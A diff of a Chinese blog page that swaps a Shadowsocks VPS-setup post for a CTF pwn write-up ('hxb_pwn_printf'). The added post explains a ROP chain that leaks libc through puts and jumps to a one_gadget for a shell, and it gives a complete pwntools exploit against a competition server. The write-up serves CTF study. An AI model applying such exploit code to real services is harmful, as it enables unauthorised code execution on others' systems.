@@ -96,20 +96,18 @@
 
 
 
-  <meta name="description" content="去搬瓦工买一台服务器 搬瓦工地址 安装centos系统用ssh远程登陆服务器 任意的ssh工具即可 在搬瓦工页面找到服务器地址和ssh端口号 配置服务器   输入命令 12345wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.s">
-<meta name="keywords" content="vps(科学上网)">
+  <meta name="description" content="pwn_printf思路程序有一个存在栈溢出的函数vul  连续输入0x10个30以后，就会进入到vul，此时写入 1payload=b&apos;a&apos;*8+p64(rdi)+p64(pelf.got[&apos;puts&apos;])+p64( pelf.plt[&apos;puts&apos;])+p64(rdi)+p64(0x200)+p64(vul) payload=b’a’*8+p64(rdi)+p64(pelf.got[‘puts’">
+<meta name="keywords" content="CTF,pwn,hxb">
 <meta property="og:type" content="article">
-<meta property="og:title" content="VPS服务器配置">
-<meta property="og:url" content="http://yoursite.com/2020/01/26/vps-build/index.html">
+<meta property="og:title" content="hxb_pwn_printf">
+<meta property="og:url" content="http://yoursite.com/2020/11/05/hxb-pwn-printf/index.html">
 <meta property="og:site_name" content="xkaneiki&#39;s blog">
-<meta property="og:description" content="去搬瓦工买一台服务器 搬瓦工地址 安装centos系统用ssh远程登陆服务器 任意的ssh工具即可 在搬瓦工页面找到服务器地址和ssh端口号 配置服务器   输入命令 12345wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.s">
+<meta property="og:description" content="pwn_printf思路程序有一个存在栈溢出的函数vul  连续输入0x10个30以后，就会进入到vul，此时写入 1payload=b&apos;a&apos;*8+p64(rdi)+p64(pelf.got[&apos;puts&apos;])+p64( pelf.plt[&apos;puts&apos;])+p64(rdi)+p64(0x200)+p64(vul) payload=b’a’*8+p64(rdi)+p64(pelf.got[‘puts’">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2020/01/26/vps-build/example.png">
-<meta property="og:updated_time" content="2020-10-21T16:47:46.699Z">
+<meta property="og:updated_time" content="2020-11-05T09:51:25.021Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="VPS服务器配置">
-<meta name="twitter:description" content="去搬瓦工买一台服务器 搬瓦工地址 安装centos系统用ssh远程登陆服务器 任意的ssh工具即可 在搬瓦工页面找到服务器地址和ssh端口号 配置服务器   输入命令 12345wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.s">
-<meta name="twitter:image" content="http://yoursite.com/2020/01/26/vps-build/example.png">
+<meta name="twitter:title" content="hxb_pwn_printf">
+<meta name="twitter:description" content="pwn_printf思路程序有一个存在栈溢出的函数vul  连续输入0x10个30以后，就会进入到vul，此时写入 1payload=b&apos;a&apos;*8+p64(rdi)+p64(pelf.got[&apos;puts&apos;])+p64( pelf.plt[&apos;puts&apos;])+p64(rdi)+p64(0x200)+p64(vul) payload=b’a’*8+p64(rdi)+p64(pelf.got[‘puts’">
 
 
 
@@ -117,7 +115,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2020/01/26/vps-build/">
+  <link rel="canonical" href="http://yoursite.com/2020/11/05/hxb-pwn-printf/">
 
 
 
@@ -127,7 +125,7 @@
   };
 </script>
 
-  <title>VPS服务器配置 | xkaneiki's blog</title>
+  <title>hxb_pwn_printf | xkaneiki's blog</title>
   
 
 
@@ -326,7 +324,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/vps-build/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/hxb-pwn-printf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xkaneiki">
@@ -343,7 +341,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">VPS服务器配置
+          <h1 class="post-title" itemprop="name headline">hxb_pwn_printf
 
               
             
@@ -369,24 +367,12 @@
                 
               
 
-              <time title="Created: 2020-01-26 04:48:32" itemprop="dateCreated datePublished" datetime="2020-01-26T04:48:32+08:00">2020-01-26</time>
+              <time title="Created: 2020-11-05 17:49:43 / Modified: 17:51:25" itemprop="dateCreated datePublished" datetime="2020-11-05T17:49:43+08:00">2020-11-05</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-22 00:47:46" itemprop="dateModified" datetime="2020-10-22T00:47:46+08:00">2020-10-22</time>
               
             
           </span>
@@ -420,21 +406,21 @@
       
 
       
-        <h1 id="去搬瓦工买一台服务器"><a href="#去搬瓦工买一台服务器" class="headerlink" title="去搬瓦工买一台服务器"></a>去搬瓦工买一台服务器</h1><ul>
-<li><a href="https://bwh88.net/aff.php?aff=47237" target="_blank" rel="noopener">搬瓦工地址</a></li>
-<li>安装centos系统<h1 id="用ssh远程登陆服务器"><a href="#用ssh远程登陆服务器" class="headerlink" title="用ssh远程登陆服务器"></a>用ssh远程登陆服务器</h1></li>
-<li>任意的ssh工具即可</li>
-<li>在搬瓦工页面找到服务器地址和ssh端口号<!-- <img src="/2020/01/26/vps-build/example.png" title="[example]"> -->
-<img src="/2020/01/26/vps-build/example.png" alt><h1 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h1></li>
-</ul>
+        <h1 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>程序有一个存在栈溢出的函数vul</p>
 <ol>
-<li><p>输入命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line"></span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>
+<li><p>连续输入0x10个30以后，就会进入到vul，此时写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b'a'</span>*<span class="number">8</span>+p64(rdi)+p64(pelf.got[<span class="string">'puts'</span>])+p64( pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(<span class="number">0x200</span>)+p64(vul)</span><br></pre></td></tr></table></figure>
+<p>payload=b’a’*8+p64(rdi)+p64(pelf.got[‘puts’])+p64( pelf.plt[‘puts’])+p64(rdi)+p64(0x200)+p64(vul)</p>
 </li>
-<li><p>配置密码和端口号</p>
-</li>
-<li>选择加密方式为aes-256-cfb</li>
 </ol>
+<p>通过rop设置puts的参数，然后用puts泄漏出libc的地址，然后通过rop重新设置vul写入的长度并跳转会vul</p>
+<ol>
+<li><p>利用libc地址找到一个onegadget，通过栈溢出跳转执行获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'a'</span>*<span class="number">8</span>+p64(onegadget)+<span class="number">0x200</span>*<span class="string">b'\x00'</span></span><br></pre></td></tr></table></figure>
+<p>注意onegadget的条件，rsp+N=NULL，只要一直向后写0就能够满足条件</p>
+</li>
+</ol>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.ui <span class="keyword">import</span> pause</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ip: 47.111.104.169</span></span><br><span class="line"><span class="string">port: 56706</span></span><br><span class="line"><span class="string">protocol: tcp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># p = process('./pwn_printf')</span></span><br><span class="line">p = remote(<span class="string">'47.111.104.169'</span>, <span class="number">56706</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd = 'b *0x40112E\n'</span></span><br><span class="line">cmd = <span class="string">'b *0x401181\n'</span></span><br><span class="line">cmd += <span class="string">'b *0x4007C6'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,cmd)</span></span><br><span class="line">pelf=ELF(<span class="string">'./pwn_printf'</span>)</span><br><span class="line">lelf = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You will find this game very interesting\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">    p.sendline(<span class="string">'30'</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x401213</span></span><br><span class="line">rsi_r15 = <span class="number">0x401211</span></span><br><span class="line">vul = <span class="number">0x4007C6</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">8</span>+p64(rdi)+p64(pelf.got[<span class="string">'puts'</span>])+p64(pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(<span class="number">0x200</span>)+p64(vul)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts=u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'puts'</span>,hex(puts))</span><br><span class="line">libc = puts<span class="number">-0x06f6a0</span></span><br><span class="line">print(<span class="string">'libc'</span>,hex(libc))</span><br><span class="line"></span><br><span class="line">r = libc+<span class="number">0x0f7310</span></span><br><span class="line">print(<span class="string">'read'</span>, hex(r))</span><br><span class="line"></span><br><span class="line">onegadget = libc+<span class="number">0x4527a</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">8</span>+p64(onegadget)+<span class="number">0x200</span>*<span class="string">b'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -458,7 +444,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/vps-科学上网/" rel="tag"># vps(科学上网)</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/hxb/" rel="tag"># hxb</a>
           
         </div>
       
@@ -471,8 +461,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/28/Booth算法/" rel="next" title="Booth算法">
-                <i class="fa fa-chevron-left"></i> Booth算法
+              <a href="/2020/10/27/Linux-pwn/" rel="next" title="Linux_pwn">
+                <i class="fa fa-chevron-left"></i> Linux_pwn
               </a>
             
           </div>
@@ -481,8 +471,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/01/27/dns-collect/" rel="prev" title="DNS收集">
-                DNS收集 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/11/05/hxb-blend-pwn/" rel="prev" title="hxb_blend_pwn">
+                hxb_blend_pwn <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -648,7 +638,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#去搬瓦工买一台服务器"><span class="nav-number">1.</span> <span class="nav-text">去搬瓦工买一台服务器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#用ssh远程登陆服务器"><span class="nav-number">2.</span> <span class="nav-text">用ssh远程登陆服务器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#配置服务器"><span class="nav-number">3.</span> <span class="nav-text">配置服务器</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-printf"><span class="nav-number">1.</span> <span class="nav-text">pwn_printf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.2.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
             
 
           </div>
